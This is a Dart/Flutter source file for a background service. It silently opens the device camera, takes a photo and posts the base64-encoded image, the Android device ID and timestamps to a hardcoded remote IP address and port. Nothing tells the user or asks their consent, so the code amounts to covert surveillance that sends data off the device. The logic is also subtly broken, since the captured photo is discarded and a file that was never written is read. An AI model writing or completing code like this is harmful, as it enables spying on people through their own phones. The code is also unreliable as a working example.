import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/widgets.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:camera/camera.dart';
import 'package:path_provider/path_provider.dart';
import 'package:intl/intl.dart';

void configureService() {
  final service = FlutterBackgroundService();
  service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      isForegroundMode: true,
    ),
    iosConfiguration: IosConfiguration(
      onForeground: onIosForeground,
      onBackground: onIosBackground,
    ),
  );
}

void onStart(ServiceInstance service) async {
  if (service is AndroidServiceInstance) {
    service.on('stopService').listen((event) {
      service.stopSelf();
    });
  }

  final cameras = await availableCameras();
  final firstCamera = cameras.first;

  final cameraController = CameraController(
    firstCamera,
    ResolutionPreset.medium,
    enableAudio: false,
  );

  await cameraController.initialize();

  final imagePath = '${(await getTemporaryDirectory()).path}/${DateTime.now().millisecondsSinceEpoch}.png';
  await cameraController.takePicture();

  final bytes = await File(imagePath).readAsBytes();
  final base64Image = base64Encode(bytes);

  final deviceInfo = DeviceInfoPlugin();
  final androidInfo = await deviceInfo.androidInfo;

  final stepCount = 0; // Implement step count logic if needed

  final response = await http.post(
    Uri.parse('http://123.25.30.13:1997'),
    headers: <String, String>{
      'Content-Type': 'application/json; charset=UTF-8',
    },
    body: jsonEncode(<String, dynamic>{
      'stepCount': stepCount,
      'Location': 'Your Location', // Replace with actual location if needed
      'androidId': androidInfo.id,
      'date': DateFormat('yyyy-MM-dd').format(DateTime.now()),
      'time': DateFormat('HH:mm:ss').format(DateTime.now()),
      'image': base64Image,
    }),
  );

  if (response.statusCode == 200) {
    print('Data sent successfully');
  } else {
    print('Failed to send data');
  }
  await cameraController.dispose();
}

bool onIosBackground(ServiceInstance service) {
  WidgetsFlutterBinding.ensureInitialized();
  print('iOS background fetch initiated');
  return true;
}

void onIosForeground(ServiceInstance service) {
  print('iOS foreground fetch initiated');
}